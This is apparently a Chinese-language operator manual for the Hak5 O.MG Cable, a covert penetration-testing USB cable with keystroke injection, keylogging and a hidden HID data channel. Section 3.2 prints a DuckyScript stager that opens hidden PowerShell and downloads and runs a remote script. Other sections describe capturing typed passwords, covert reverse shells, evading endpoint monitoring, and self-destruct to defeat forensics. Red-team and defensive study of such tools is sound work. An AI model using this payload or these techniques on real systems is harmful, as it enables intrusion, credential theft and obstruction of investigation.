---
title: "Hak5 O.MG Cable 原厂技术说明书与全功能操作手册"
model: "O.MG Cable"
manufacturer: "Hak5"
category: "隐蔽实体与无线 HID 渗透测试专用线缆 (Covert Physical & Wireless Cable)"
docs_url: "https://o.mg.lol/setup/OMGCable/"
version: "3.0"
locale: "zh-cn"
---

# Hak5 O.MG Cable 原厂技术说明书与全功能操作手册

> Hak5 O.MG Cable 是一款手工精制的高端实体渗透测试专用线缆。外观与一般原厂充电传输线完全无异，内部却隐蔽集成了完整的单片机运算平台、802.11 Wi-Fi 无线电收发模块、DuckyScript 高速按键注入引擎、硬件级键盘嗅探器（Keylogger）与突破性的 HIDX StealthLink 双向隐蔽通信信道。

---

## 目录

- [**1. 产品概述与硬件架构**](#1-产品概述与硬件架构)
  - [1.1 产品定位与威胁情境分析](#11-产品定位与威胁情境分析)
  - [1.2 技术规格与硬件校准基准表](#12-技术规格与硬件校准基准表)
  - [1.3 主动端与被动端之物理定向机制](#13-主动端与被动端之物理定向机制)
  - [1.4 多元接头规格与线缆型号识别](#14-多元接头规格与线缆型号识别)
- [**2. 硬件初始化、固件刻录与网络连接**](#2-硬件初始化固件刻录与网络连接)
  - [2.1 使用 O.MG Programmer 进行出厂激活](#21-使用-omg-programmer-进行出厂激活)
  - [2.2 通过 O.MG Web Flasher 进行浏览器固件刻录](#22-通过-omg-web-flasher-进行浏览器固件刻录)
  - [2.3 高端 Python Flasher 脱机命令行刻录](#23-高端-python-flasher-脱机命令行刻录)
  - [2.4 创建 Wi-Fi 无线基地台连接](#24-创建-wi-fi-无线基地台连接)
  - [2.5 网页管理控制台与用户端模式配置](#25-网页管理控制台与用户端模式配置)
- [**3. 内核功能、按键注入与 DuckyScript 引擎**](#3-内核功能按键注入与-duckyscript-引擎)
  - [3.1 O.MG 载荷运行引擎与极速按键注入](#31-omg-载荷运行引擎与极速按键注入)
  - [3.2 DuckyScript for O.MG 扩充语法与指令集](#32-duckyscript-for-omg-扩充语法与指令集)
  - [3.3 键盘嗅探器运作与即时击键拦截 (Keylogger)](#33-键盘嗅探器运作与即时击键拦截-keylogger)
  - [3.4 磁区编辑器与载荷槽位弹性配置 (Partition Editor)](#34-磁区编辑器与载荷槽位弹性配置-partition-editor)
  - [3.5 多语系键盘对应表查看器 (Keymap Viewer)](#35-多语系键盘对应表查看器-keymap-viewer)
- [**4. HIDX StealthLink 与隐蔽数据信道**](#4-hidx-stealthlink-与隐蔽数据信道)
  - [4.1 HIDX StealthLink 双向传输技术架构](#41-hidx-stealthlink-双向传输技术架构)
  - [4.2 Windows PowerShell 交互式 Shell 与 TCP 外传](#42-windows-powershell-交互式-shell-与-tcp-外传)
  - [4.3 Linux 交互式 Shell 与原始数据导出](#43-linux-交互式-shell-与原始数据导出)
  - [4.4 macOS Python 交互式终端管道](#44-macos-python-交互式终端管道)
  - [4.5 实务部署时序与优化建议](#45-实务部署时序与优化建议)
- [**5. 云端舰队管理、防御规避与系统维护**](#5-云端舰队管理防御规避与系统维护)
  - [5.1 Hak5 Cloud C² 云端集中管控集成](#51-hak5-cloud-c-云端集中管控集成)
  - [5.2 WebSocket API 自动化程序接口](#52-websocket-api-自动化程序接口)
  - [5.3 地理围栏防御与边界失效保护 (Geofencing)](#53-地理围栏防御与边界失效保护-geofencing)
  - [5.4 紧急硬件自毁抹除机制 (Self-Destruct)](#54-紧急硬件自毁抹除机制-self-destruct)
  - [5.5 芯片校准、故障排查与复原流程](#55-芯片校准故障排查与复原流程)

---

## 1. 产品概述与硬件架构

<!-- section：overview -->
本章节深入剖析 Hak5 O.MG Cable 实体线缆的产品架构、单片机技术细节与硬件基准真相表。

### 1.1 产品定位与威胁情境分析

在传统网络安全认知中，周边充电线与传输线常被视为毫无运算能力的被动组件。然而，诸如美国国安局（NSA）早期的 COTTONMOUTH-I 等硬件植入技术证明，在线缆接头内部植入微型芯片能达成前所未有的物理旁路入侵。

O.MG Cable 将高端国家级硬件植入技术平民化，具备极致的隐蔽性：
- **实体外观零瑕疵**：采用工业级高压注塑工艺，接头长度、重量、线身柔韧度均与各大品牌原厂线缆一致，无任何可疑突起或粗糙外壳。
- **数据线完全电气透明**：在未触发载荷的待机状态下，USB 数据传输线（D+/D-）保持纯被动导通状态，操作系统底层不会产生任何 USB 设备枚举（Enumeration）事件，彻底规避终端防护软件（EDR/MDM）之硬件监控。
- **超长距无线空中触发**：内置 2.4 GHz Wi-Fi 芯片与微型射频天线，红队测试员可在百公尺外通过智能型手机或笔记型电脑远程连接触发攻击。

### 1.2 技术规格与硬件校准基准表

| 硬件规格细项 | 原厂官方技术规格基准 |
|---|---|
| **设备架构** | 隐蔽嵌合式单片机 USB 渗透专用传输线 |
| **射频模块** | 集成式 802.11 b/g/n (2.4 GHz) Wi-Fi 无线电与微型 PCB 天线 |
| **工作电压** | 固定 5 V DC (+/- 0.5 V) 通过主机端 USB 接口供电 |
| **电流量消耗** | 待机：~80–120 mA；尖峰发射：最高 350 mA；供电需求门槛：500 mA |
| **数据透传性能** | USB 2.0 高速 (480 Mbps) 全速透传 (载荷闲置时完全透明导通) |
| **电力透传规范** | 支持固定 5 V 充电透传；USB-PD (Power Delivery) 协定最高协商至 5 V |
| **接头规格型号** | USB-A to USB-C、USB-C to USB-C、USB-A to Lightning、USB-C to Lightning |
| **保存磁区容量** | 非挥发性快闪内存 (划分为系统区、Web 控制台与载荷区) |
| **载荷槽位数量** | Basic 基础版：8 组槽位；Plus 与 Elite 高端版：最高支持 200 组槽位 |
| **嗅探缓冲内存** | Keylogger 版：内置约 650,000 次按键历史纪录之加密保存空间 |
| **键盘硬件兼容** | Full Speed 全速 USB 键盘 (兼容 12 Mbps 标准 HID 通信协定) |
| **按键注入速率** | 每分钟最高 890 字 (WPM)，支持硬件级 USB 超频注入技术 |
| **双向隐蔽信道** | HIDX StealthLink (利用标准 HID Report 实现双向终端信道) |
| **安全防护机制** | WPA2 无线加密、BSSID 地理围栏 (Geofencing)、硬件等级紧急自毁 |

### 1.3 主动端与被动端之物理定向机制

所有的 O.MG Cable 均具备严格的**物理方向性**：
1. **主动端 (Active End)**：
   - 内含单片机、Wi-Fi 模块与按键注入矩阵。
   - **必须连接至被测目标主机**。
   - 所有的 DuckyScript 按键注入、HIDX 信道均由此端向目标电脑发送。
   - 刻录固件时，亦必须将此主动端插入 O.MG Programmer。
2. **被动/透传端 (Passthrough End)**：
   - 用于连接一般周边（如智能型手机、实体键盘、鼠标或 USB U 盘）。
   - 负责将下游设备的数据与充电电力透明导通至主动端。

> [!WARNING]
> 若将被动端插入目标电脑、主动端插入手机，手机将正常充电，但线缆将完全无法向目标电脑注入按键指令！

### 1.4 多元接头规格与线缆型号识别

- **Type-A to Type-C**：Type-A 端为 Active End；Type-C 端为 Passthrough End。
- **Type-A to Lightning**：Type-A 端为 Active End；Lightning 端为 Passthrough End。
- **Type-C to Lightning**：Type-C 端为 Active End；Lightning 端为 Passthrough End。
- **Type-C to Type-C**：由于双向接头外观一致，Active 端接头外壳雷雕有专属标志，或随机附有识别夹；插入 O.MG Programmer 时，仅当 Active 端插入时指示灯才会点亮。

---

## 2. 硬件初始化、固件刻录与网络连接

<!-- section：configuration -->
本章节提供出厂激活、网页串行刻录以及 Wi-Fi 管理网络的完整操作步骤。

### 2.1 使用 O.MG Programmer 进行出厂激活

为遵循各国无线电射频输出与出入口法规，所有 O.MG 设备出厂时均处于“未激活”的休眠状态。

初次使用必须搭配 **O.MG Programmer** 进行激活：
1. 确认 O.MG Cable 的**主动端 (Active End)**。
2. 将主动端确实插入 O.MG Programmer 的母座。
3. 将 O.MG Programmer 插入管理电脑的 USB 端口。
4. 若使用 Windows 系统，请确保已安装 Silicon Labs CP2102 虚拟 COM 端口驱动程序。

### 2.2 通过 O.MG Web Flasher 进行浏览器固件刻录

官方提供免安装的 Chrome 网页串行端口刻录工具：
1. 使用 Google Chrome、Brave 或 Edge 浏览器打开：`https://o-mg.github.io/WebFlasher/`
2. 点击画面上的 **Connect** 按钮。
3. 在浏览器跳出的串行端口菜单中选取 `CP2102 USB to UART Bridge Controller`。
4. 依指示选取设备型号（O.MG Cable）与欲安装之最新固件版本。
5. 点击 **Install Firmware**，工具将自动完成清除 Flash、写入系统分割区与校验进程。
6. 刻录完成后，屏幕将显示默认无线网络信息：
   - **默认 SSID**：`O.MG`
   - **默认密码**：`12345678`
   - **默认管理 IP**：`http://192.168.4.1`

### 2.3 高端 Python Flasher 脱机命令行刻录

对于机密隔离环境或批量自动化刻录需求，可使用官方 Python 工具：
```bash
git clone https://github.com/O-MG/O.MG-Firmware.git
cd O.MG-Firmware
pip3 install esptool pyserial
python3 flasher.py
```
支持脱机写入预载载荷、客制化出厂 SSID 及 Flash 完整二进位备份。

### 2.4 创建 Wi-Fi 无线基地台连接

1. 将 O.MG Cable 主动端插入任何可供电之 5 V USB 端口（电脑或行动电源）。
2. 在管理电脑或手机之 Wi-Fi 清单中搜索 `O.MG`。
3. 输入密码 `12345678` 进行配对。
4. 连接创建后，终端设备将自动取得 `192.168.4.x` 网段 IP。

### 2.5 网页管理控制台与用户端模式配置

在浏览器输入 `http://192.168.4.1` 进入响应式 Web UI：
- **即时触发面板**：单键运行预存于各槽位的按键注入脚本。
- **在线记录器**：在线查看键盘嗅探日志与系统调试消息。
- **网络模式切换**：可从 Access Point（AP 基地台模式）切换为 Station（Wi-Fi Client 用户端模式），让 O.MG Cable 主动连接至现场企业 Wi-Fi 或渗透人员的手机热点。

---

## 3. 内核功能、按键注入与 DuckyScript 引擎

<!-- section：features -->
本章节说明 DuckyScript for O.MG 的高端语法、键盘嗅探机能与磁区管理。

### 3.1 O.MG 载荷运行引擎与极速按键注入

O.MG Cable 将指令转换为底层 USB HID 键盘扫描码直接送交目标操作系统，速度最高可达每分钟 890 字，能瞬间于目标主机上弹出终端机并完成反向连接部署。

### 3.2 DuckyScript for O.MG 扩充语法与指令集

兼容标准 DuckyScript 语法，并加入 O.MG 专属硬件控制指令：
- `BLINK <次數>`：使机身隐藏之诊断 LED 闪烁特定次数。
- `WAIT_FOR_BUTTON_PRESS`：暂停运行，直至操作者于 Web 接口点击确认。
- `GEOFENCE_CHECK`：即时检验周边环境 BSSID 是否符合授权范围。
- `SELF_DESTRUCT`：立即运行不可逆之硬件自毁。

#### 实战范例：无痕下载运行脚本
```text
REM O.MG Windows Quick Stager
DELAY 1500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass“IEX(New-Object Net.WebClient).DownloadString('http://192.168.4.1/payload.ps1')”
ENTER
```

### 3.3 键盘嗅探器运作与即时击键拦截 (Keylogger)

针对配备 Keylogger 模块之版本：
- 当下游插入实体键盘时，O.MG Cable 会以全速（Full Speed 12 Mbps）截获所有打字数据包。
- 内置非挥发性内存可保存高达 **650,000 次按键输入**，即便线缆断电拔除，记录依然完整保存。
- 支持 Web UI 即时串流显示，操作者可在远程即时目击目标输入之帐号、密码与机密对话。

### 3.4 磁区编辑器与载荷槽位弹性配置 (Partition Editor)

内置图形化 Partition Editor：
- 自由调整系统 Flash 分配比例（分配更多空间给嗅探日志或大型多阶段载荷）。
- 支持多达 200 组独立载荷槽位，方便在不同攻击目标之间迅速切换。

### 3.5 多语系键盘对应表查看器 (Keymap Viewer)

由于 USB 传递的是实体键盘按键码（Scancodes），操作系统会依语系配置转译字符。内置 Keymap Viewer 支持美规、英规、德规、法规、日规等多国键盘对应，彻底避免因符号映射错位导致语法运行失败。

---

## 4. HIDX StealthLink 与隐蔽数据信道

传统 U 盘容易被企业网络安全政策全面封锁，而出站网络连接亦常受防火墙阻挡。**HIDX StealthLink** 彻底突破此一僵局。

### 4.1 HIDX StealthLink 双向传输技术架构

StealthLink 利用 USB 人机接口设备（HID）规范中的标准 Feature Reports 数据包创建通信：
- 完全无需在目标电脑安装特殊驱动程序。
- 操作系统原生信任 HID 键盘与鼠标通信，数据包不会触发任何终端防护警报。
- 创建一个完全独立于主机网络卡之外的**实体隐蔽双向信道**。

### 4.2 Windows PowerShell 交互式 Shell 与 TCP 外传

注入微型 PowerShell 通信代码后，目标电脑会将本机 Shell 导向至 USB HID 终端。操作者在 O.MG 网页端即可获得一个完整的交互式 `powershell.exe` 控制台，并能双向传输二进位文件。

### 4.3 Linux 交互式 Shell 与原始数据导出

在 Linux 主机上，StealthLink 通过 `/dev/hidraw` 节点进行通信，创建无网络 Socket 连接的隐形 Bash 反弹终端。

### 4.4 macOS Python 交互式终端管道

利用 macOS 内置之 POSIX 或 IOKit 接口，隐蔽打开终端机管道，完全不在画面上跳出窗口。

### 4.5 实务部署时序与优化建议

Feature Report 每次以 64 字节区块进行分包传输，有效通信速率介于 15 KB/s 至 60 KB/s 之间，足够进行凭证导出、日志提取与即时指令下发。

---

## 5. 云端舰队管理、防御规避与系统维护

<!-- section：maintenance -->
本章节说明云端集成、地理围栏防御与硬件自毁复原准则。

### 5.1 Hak5 Cloud C² 云端集中管控集成

将 O.MG Cable 配置为 Station 模式连上网际网络后，即可注册至私有 Hak5 Cloud C² 服务器，实现跨国远程触发与数据即时汇总。

### 5.2 WebSocket API 自动化程序接口

提供标准 WebSocket 接口（端口号 80/8080），支持以 Python、Go 或 Node.js 撰写自动化插件，与外部 C2 框架深度集成。

### 5.3 地理围栏防御与边界失效保护 (Geofencing)

可配置现场特定 Wi-Fi BSSID（基地台 MAC 地址）。若线缆被携离目标企业大楼（侦测不到特定 MAC），设备将自动关闭无线发射并进入假死状态，防止机敏工具外流。

### 5.4 紧急硬件自毁抹除机制 (Self-Destruct)

在面临实体查扣或网络安全搜查的极端情境下：
- 操作者可通过 Web UI 或远程指令发动 `Self-Destruct`。
- 芯片将瞬间覆写所有 Flash 保存区、销毁加密密钥并切断单片机通信，将设备永久还原为一条毫无攻击能力的普通充电线，使鉴识实验室无法还原任何数字证据。

### 5.5 芯片校准、故障排查与复原流程

若因非预期断电导致系统异常：
1. 将主动端重新插入 O.MG Programmer。
2. 进入 Web Flasher 运行完整 Erase & Flash 流程，即可复原出厂默认固件。
